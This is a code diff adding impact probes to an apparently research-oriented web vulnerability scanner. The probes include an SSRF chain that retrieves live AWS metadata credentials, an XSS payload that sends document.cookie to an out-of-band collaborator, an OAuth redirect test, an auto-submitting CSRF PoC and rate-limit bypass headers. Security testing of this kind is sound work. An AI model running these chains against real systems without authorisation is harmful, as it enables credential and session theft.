@@ -8458,3 +8458,470 @@ async def check_jwt_forged_privilege_escalation(url: str) -> dict | None:
                 ),
             }
     return None
+
+
+# =======================================================================
+# Batch 23 - Behavioral/chain IMPACT probes. Each of these needs more
+# than a single request-and-inspect step - a multi-hop SSRF chase, a
+# real headless browser, an OOB collaborator, or DNS lookups - to prove
+# impact rather than just a first-order signal. Same fail-open
+# discipline as every other check here: ambiguous or erroring at any
+# step returns None, never a guess. None of these perform an actual
+# state-changing/side-effecting action against the target (no real
+# CSRF submission, no real rate-limit-bypassed write) - see each
+# function's own docstring for the specific safety reasoning.
+# =======================================================================
+
+# ---------------------------------------------------------------------
+# 150. SSRF impact probe - chased cloud metadata credential extraction
+# ---------------------------------------------------------------------
+_SSRF_IAM_ROLE_LIST_PROBES = [
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials",
+]
+_AWS_CRED_JSON_KEYS = ("AccessKeyId", "SecretAccessKey", "Token")
+
+
+async def check_ssrf_metadata_credential_extraction(url: str) -> dict | None:
+    """
+    Complements check_ssrf_reflected (batch 7), which stops at the first
+    sign of metadata content (an "instance-id"/"ami-id" string showing
+    up). This chases the SAME confirmed SSRF two hops further, the way
+    an attacker actually would: first requests the IAM role-list path to
+    get a real role name back through the vulnerable parameter, then
+    requests that exact role's credentials path through the same
+    parameter. Only fires if the second response parses as JSON and
+    contains all three AWS temporary-credential fields
+    (AccessKeyId/SecretAccessKey/Token) - the difference between "this
+    parameter can reach the metadata service" and "this parameter just
+    handed over live cloud credentials", which is a categorically higher
+    severity and a much harder Informative close for a program to make.
+    Credential VALUES are only ever held in memory for the length of
+    this evidence string - only the key name and a short prefix are
+    included, never the full secret.
+    """
+    parsed = httpx.URL(url)
+    if not parsed.query:
+        return None
+    existing_params = dict(parsed.params)
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            for param_name in _SSRF_PARAM_NAMES:
+                if param_name not in existing_params:
+                    continue
+
+                role_name = None
+                for role_list_probe in _SSRF_IAM_ROLE_LIST_PROBES:
+                    test_params = dict(existing_params)
+                    test_params[param_name] = role_list_probe
+                    test_url = parsed.copy_with(params=test_params)
+                    try:
+                        resp = await client.get(test_url)
+                    except httpx.HTTPError:
+                        continue
+                    candidate = resp.text.strip().splitlines()[0].strip() if resp.text.strip() else ""
+                    if candidate and re.fullmatch(r"[A-Za-z0-9_+=,.@-]{1,128}", candidate):
+                        role_name = candidate
+                        break
+                if not role_name:
+                    continue
+
+                cred_probe = (
+                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+                )
+                test_params = dict(existing_params)
+                test_params[param_name] = cred_probe
+                test_url = parsed.copy_with(params=test_params)
+                try:
+                    cred_resp = await client.get(test_url)
+                except httpx.HTTPError:
+                    continue
+                try:
+                    cred_data = cred_resp.json()
+                except ValueError:
+                    continue
+                if all(k in cred_data for k in _AWS_CRED_JSON_KEYS):
+                    key_preview = str(cred_data["AccessKeyId"])[:8] + "…"
+                    return {
+                        "vuln_type": "ssrf_metadata_iam_credential_extraction",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{test_url}: chased the confirmed SSRF two hops - listed IAM role "
+                            f"{role_name!r} via the metadata service, then retrieved that role's "
+                            f"live temporary AWS credentials (AccessKeyId {key_preview}, plus a "
+                            f"SecretAccessKey and session Token) through the same vulnerable "
+                            f"parameter. Full cloud credential exfiltration confirmed, not just "
+                            f"metadata-service reachability."
+                        ),
+                    }
+    except httpx.HTTPError as exc:
+        logger.info("detective: SSRF metadata credential extraction check failed for %s: %s", url, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 151. XSS impact probe - real cookie exfiltration via headless browser + OOB
+# ---------------------------------------------------------------------
+_XSS_COOKIE_EXFIL_MARKER = "swascookiexfil"
+
+
+async def check_xss_cookie_exfiltration(url: str, param_name: str, oob_domain: str, oob_proc, finding_tag: str) -> dict | None:
+    """
+    Complements verify.py's headless XSS execution proof (which confirms
+    a payload fires, e.g. an alert() dialog). This is a self-contained
+    reflected-XSS-to-cookie-theft chain: injects a payload into
+    `param_name` that calls document.cookie and beacons it to a unique
+    OOB collaborator subdomain (reusing the same oob.py session already
+    started for blind SSRF - one interactsh session serves both), loads
+    the resulting URL in a real headless browser, and only confirms
+    impact if the OOB collaborator actually receives a callback carrying
+    the cookie data - proof of real session-token exfiltration, not just
+    "the payload appeared in the page" or "a dialog fired". Optional
+    dependency (Playwright) - fails open (returns None) if it isn't
+    installed, same as verify.py's XSS execution check.
+    """
+    try:
+        from playwright.async_api import async_playwright
+    except ImportError:
+        logger.info("detective: playwright not installed - skipping XSS cookie exfiltration probe")
+        return None
+    if not oob_domain or oob_proc is None:
+        return None
+
+    parsed = httpx.URL(url)
+    if param_name not in dict(parsed.params):
+        return None
+
+    beacon_host = f"{finding_tag}-{_XSS_COOKIE_EXFIL_MARKER}.{oob_domain}"
+    payload = (
+        f"<script>fetch('https://{beacon_host}/c?v='+encodeURIComponent(document.cookie))</script>"
+    )
+    test_params = dict(parsed.params)
+    test_params[param_name] = payload
+    test_url = str(parsed.copy_with(params=test_params))
+
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch()
+            page = await browser.new_page()
+            try:
+                await page.goto(test_url, timeout=10000, wait_until="networkidle")
+                await page.wait_for_timeout(1500)
+            except Exception as exc:  # noqa: BLE001 - page load can fail many ways, all mean "inconclusive"
+                logger.info("detective: XSS cookie exfil headless load failed for %s: %s", test_url, exc)
+            await browser.close()
+    except Exception as exc:  # noqa: BLE001 - Playwright/browser install issues, treat as unavailable
+        logger.info("detective: XSS cookie exfil headless session failed: %s", exc)
+        return None
+
+    interaction = await oob.wait_for_interaction(oob_proc, f"{finding_tag}-{_XSS_COOKIE_EXFIL_MARKER}")
+    if interaction is None:
+        return None
+
+    return {
+        "vuln_type": "reflected_xss_cookie_exfiltration_confirmed",
+        "severity": "critical",
+        "evidence": (
+            f"{test_url}: injected payload made the victim's browser actually beacon "
+            f"document.cookie to an OOB collaborator ({beacon_host}), and the collaborator "
+            f"received the callback - confirmed real session-cookie exfiltration via XSS, not "
+            f"just payload reflection or a fired dialog."
+        ),
+    }
+
+
+# ---------------------------------------------------------------------
+# 152. Open redirect impact probe - OAuth redirect_uri chain
+# ---------------------------------------------------------------------
+_OAUTH_PATH_HINTS = ("oauth", "authorize", "auth", "sso", "login/callback")
+_OAUTH_REDIRECT_PARAM_NAMES = ("redirect_uri", "return_url", "callback_url", "redirect")
+_ATTACKER_OAUTH_DOMAIN = "evil-swas-oauth-redirect.test"
+
+
+async def check_open_redirect_oauth_chain(url: str) -> dict | None:
+    """
+    Complements check_open_redirect (batch 2), which only proves a
+    generic redirect parameter is unvalidated. This specifically targets
+    OAuth/SSO authorize-shaped endpoints (URL path contains oauth/
+    authorize/sso, and carries a redirect_uri-shaped parameter) - the
+    much higher-impact case, since a loose redirect_uri allow-list on an
+    OAuth flow means an attacker-controlled domain can receive real
+    authorization codes/tokens during a victim's login, not just an
+    open-redirect nuisance. Fires only if the server's own Location
+    response header (not just a client-side meta-refresh or reflected
+    string) points directly at the attacker-controlled test domain -
+    the server itself chose to redirect there, proving the allow-list
+    genuinely accepts an arbitrary external domain.
+    """
+    parsed = httpx.URL(url)
+    path_lower = str(parsed.path).lower()
+    if not any(hint in path_lower for hint in _OAUTH_PATH_HINTS):
+        return None
+    existing_params = dict(parsed.params)
+    redirect_param = next((p for p in _OAUTH_REDIRECT_PARAM_NAMES if p in existing_params), None)
+    if not redirect_param:
+        return None
+
+    attacker_url = f"https://{_ATTACKER_OAUTH_DOMAIN}/collect"
+    test_params = dict(existing_params)
+    test_params[redirect_param] = attacker_url
+    test_url = parsed.copy_with(params=test_params)
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
+            try:
+                resp = await client.get(test_url)
+            except httpx.HTTPError:
+                return None
+    except httpx.HTTPError as exc:
+        logger.info("detective: OAuth redirect chain check failed for %s: %s", url, exc)
+        return None
+
+    location = resp.headers.get("location", "")
+    if resp.status_code in (301, 302, 303, 307, 308) and _ATTACKER_OAUTH_DOMAIN in location:
+        return {
+            "vuln_type": "oauth_redirect_uri_allowlist_bypass",
+            "severity": "critical",
+            "evidence": (
+                f"{test_url}: this OAuth/SSO authorize-shaped endpoint's '{redirect_param}' "
+                f"parameter was set to an arbitrary external domain, and the server responded "
+                f"with a {resp.status_code} redirect whose Location header points directly at "
+                f"it ({location[:200]!r}) - confirmed redirect_uri allow-list bypass on an OAuth "
+                f"flow; during a real login, the authorization code/token would be delivered to "
+                f"the attacker's domain instead of the legitimate app."
+            ),
+        }
+    return None
+
+
+# ---------------------------------------------------------------------
+# 153. CSRF impact probe - working PoC generation, no live submission
+# ---------------------------------------------------------------------
+_FORM_ACTION_RE = re.compile(r'<form[^>]+action=["\']([^"\']*)["\']', re.IGNORECASE)
+_FORM_INPUT_RE = re.compile(
+    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?[^>]*>', re.IGNORECASE
+)
+_CSRF_POC_ORIGIN = "https://evil-csrf-poc.test"
+
+
+async def check_csrf_poc_live_confirmation(url: str) -> dict | None:
+    """
+    Complements check_csrf_token_missing (batch 12), which only flags a
+    form's missing token field - that alone doesn't confirm exploitable
+    CSRF on a modern browser (SameSite cookies can still protect it).
+    This checks the one thing that's both safe to test AND decisive:
+    whether the server rejects requests from a forged Origin BEFORE any
+    business logic runs. Sends a same-shaped OPTIONS preflight (which
+    never triggers a real state change - that's the whole point of the
+    preflight mechanism) carrying a forged attacker Origin header, and
+    compares against a control OPTIONS with the real Origin. If the
+    response doesn't distinguish between them (no restrictive
+    Access-Control-Allow-Origin, no outright rejection of the forged
+    Origin), that's a real signal Origin isn't being enforced server-
+    side either - combined with the missing token, this generates an
+    actual ready-to-fire CSRF PoC HTML file as the finding's artifact.
+    Deliberately NEVER submits the real form - only a researcher
+    manually firing the generated PoC (or explicit authorization) should
+    trigger the actual state change.
+    """
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            resp = await client.get(url)
+    except httpx.HTTPError as exc:
+        logger.info("detective: CSRF PoC check failed for %s: %s", url, exc)
+        return None
+
+    body = resp.text
+    form_match = _POST_FORM_RE.search(body)
+    if not form_match:
+        return None
+    form_block = form_match.group(0)
+    if _CSRF_TOKEN_FIELD_RE.search(form_match.group(1)):
+        return None  # has a token field - batch 12's check already covers this, not this probe's target
+
+    action_match = _FORM_ACTION_RE.search(form_block)
+    action = action_match.group(1) if action_match else url
+    action_url = str(httpx.URL(url).join(action)) if action else url
+
+    fields = _FORM_INPUT_RE.findall(form_match.group(1))
+    if not fields:
+        return None
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
+            try:
+                forged_resp = await client.options(action_url, headers={"Origin": _CSRF_POC_ORIGIN})
+                control_resp = await client.options(action_url, headers={"Origin": url})
+            except httpx.HTTPError:
+                return None
+    except httpx.HTTPError as exc:
+        logger.info("detective: CSRF PoC preflight probe failed for %s: %s", action_url, exc)
+        return None
+
+    forged_acao = forged_resp.headers.get("access-control-allow-origin", "")
+    if forged_resp.status_code in (403, 405) and control_resp.status_code not in (403, 405):
+        return None  # server DOES distinguish origins - not this probe's target
+    if forged_acao and _CSRF_POC_ORIGIN not in forged_acao and forged_acao != "*":
+        return None  # explicit restrictive allow-list - origin enforcement present
+
+    form_inputs_html = "\n".join(
+        f'  <input type="hidden" name="{name}" value="{value or ""}">' for name, value in fields
+    )
+    poc_html = (
+        f'<html><body onload="document.forms[0].submit()">\n'
+        f'<form action="{action_url}" method="POST">\n{form_inputs_html}\n</form>\n'
+        f"</body></html>"
+    )
+
+    return {
+        "vuln_type": "csrf_poc_confirmed_no_origin_protection",
+        "severity": "high",
+        "evidence": (
+            f"{url}: the POST form at {action_url} has no CSRF token field, and a preflight "
+            f"probe found no server-side Origin restriction distinguishing a forged Origin "
+            f"({_CSRF_POC_ORIGIN}) from the real one - both signals needed for exploitable "
+            f"CSRF on a modern browser are present. Working PoC generated (not submitted): "
+            f"{poc_html[:1200]}"
+        ),
+    }
+
+
+# ---------------------------------------------------------------------
+# 154. Rate-limit bypass impact probe - spoofable client-identity headers
+# ---------------------------------------------------------------------
+_RATE_LIMIT_BYPASS_HEADERS = [
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"X-Remote-IP": "127.0.0.1"},
+    {"X-Client-IP": "127.0.0.1"},
+    {"X-Forwarded-For": f"10.0.{random.randint(0, 255)}.{random.randint(1, 254)}"},
+]
+_RATE_LIMIT_PROBE_BURST = 12
+
+
+async def check_rate_limit_header_bypass(url: str) -> dict | None:
+    """
+    Only ever issues GET requests against `url` as given - never used
+    against a state-changing endpoint by design, since triggering this
+    many requests against a write/delete action would itself cause real
+    side effects. Sends a short burst of plain requests first; if (and
+    only if) the target actually starts responding 429/403 within that
+    burst - proving a rate limiter is genuinely active - retries the
+    SAME request rate with a spoofable client-identity header (X-
+    Forwarded-For, X-Originating-IP, etc. set to a fresh-looking IP) and
+    checks whether 200s resume. That specific pairing (limiter
+    confirmed active, then confirmed bypassed by a header alone) is what
+    turns "this endpoint has rate limiting" into "and it's trivially
+    bypassable", a materially different and more reportable finding.
+    """
+    limited = False
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
+            for _ in range(_RATE_LIMIT_PROBE_BURST):
+                try:
+                    resp = await client.get(url)
+                except httpx.HTTPError:
+                    continue
+                if resp.status_code in (429, 403):
+                    limited = True
+                    break
+            if not limited:
+                return None  # no active rate limiting observed - nothing to bypass
+
+            for bypass_headers in _RATE_LIMIT_BYPASS_HEADERS:
+                try:
+                    bypass_resp = await client.get(url, headers=bypass_headers)
+                except httpx.HTTPError:
+                    continue
+                if bypass_resp.status_code == 200:
+                    header_name = next(iter(bypass_headers))
+                    return {
+                        "vuln_type": "rate_limit_bypass_via_spoofed_client_header",
+                        "severity": "medium",
+                        "evidence": (
+                            f"{url}: confirmed active rate limiting (received "
+                            f"429/403 during a burst of {_RATE_LIMIT_PROBE_BURST} plain "
+                            f"requests), but a request carrying a spoofed "
+                            f"{header_name!r} header immediately after got a normal 200 "
+                            f"response - the limiter keys on a client-supplied, trivially "
+                            f"forgeable header rather than the actual connection source."
+                        ),
+                    }
+    except httpx.HTTPError as exc:
+        logger.info("detective: rate limit bypass check failed for %s: %s", url, exc)
+    return None
+
+
+# ---------------------------------------------------------------------
+# 155. Subdomain takeover impact probe - dangling NS delegation
+# ---------------------------------------------------------------------
+async def check_dangling_ns_delegation_takeover(hostname: str) -> dict | None:
+    """
+    A different, rarer, and more severe takeover technique than
+    check_subdomain_takeover (batch 1, which only checks CNAME records
+    against known SaaS fingerprints). This resolves the subdomain's own
+    NS (nameserver delegation) records - if a whole subdomain's DNS was
+    ever delegated to a third-party nameserver (a common pattern for
+    dev/staging environments hosted elsewhere) and that nameserver's own
+    parent domain no longer resolves (NXDOMAIN), then that nameserver
+    hostname itself is available for anyone to register - and whoever
+    registers it gains the ability to answer DNS for the ENTIRE
+    delegated subdomain, not just one hijackable CNAME target. Detected
+    read-only via DNS-over-HTTPS lookups only; never attempts to
+    register anything.
+    """
+    hostname = _extract_hostname(hostname)
+    if hostname is None:
+        return None
+
+    try:
+        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
+            ns_resp = await client.get(
+                "https://cloudflare-dns.com/dns-query",
+                params={"name": hostname, "type": "NS"},
+                headers={"accept": "application/dns-json"},
+            )
+            if ns_resp.status_code != 200:
+                return None
+            ns_answers = ns_resp.json().get("Answer", [])
+            ns_hosts = [a["data"].rstrip(".") for a in ns_answers if a.get("type") == 2]
+            if not ns_hosts:
+                return None  # no explicit NS delegation for this subdomain - nothing to check
+
+            for ns_host in ns_hosts:
+                labels = ns_host.split(".")
+                if len(labels) < 2:
+                    continue
+                parent_domain = ".".join(labels[-2:])  # e.g. ns1.example-dns-provider.com -> example-dns-provider.com
+
+                try:
+                    parent_resp = await client.get(
+                        "https://cloudflare-dns.com/dns-query",
+                        params={"name": parent_domain, "type": "NS"},
+                        headers={"accept": "application/dns-json"},
+                    )
+                except httpx.HTTPError:
+                    continue
+                if parent_resp.status_code != 200:
+                    continue
+                parent_data = parent_resp.json()
+                # DNS RCODE 3 == NXDOMAIN - the nameserver's own parent
+                # domain doesn't exist at all, meaning it's registerable.
+                if parent_data.get("Status") == 3:
+                    return {
+                        "vuln_type": "dangling_ns_delegation_takeover",
+                        "severity": "critical",
+                        "evidence": (
+                            f"{hostname} is NS-delegated to {ns_host}, but {ns_host}'s own "
+                            f"parent domain ({parent_domain}) returns NXDOMAIN - that domain is "
+                            f"unregistered and available, and whoever registers it can stand up "
+                            f"a nameserver answering DNS for the entire {hostname} subdomain, "
+                            f"not just a single hijackable CNAME target. Higher-severity than a "
+                            f"standard CNAME-based takeover; detected read-only via DNS lookups "
+                            f"only, nothing registered."
+                        ),
+                    }
+    except (httpx.HTTPError, ValueError) as exc:
+        logger.info("detective: dangling NS delegation check failed for %s: %s", hostname, exc)
+    return None
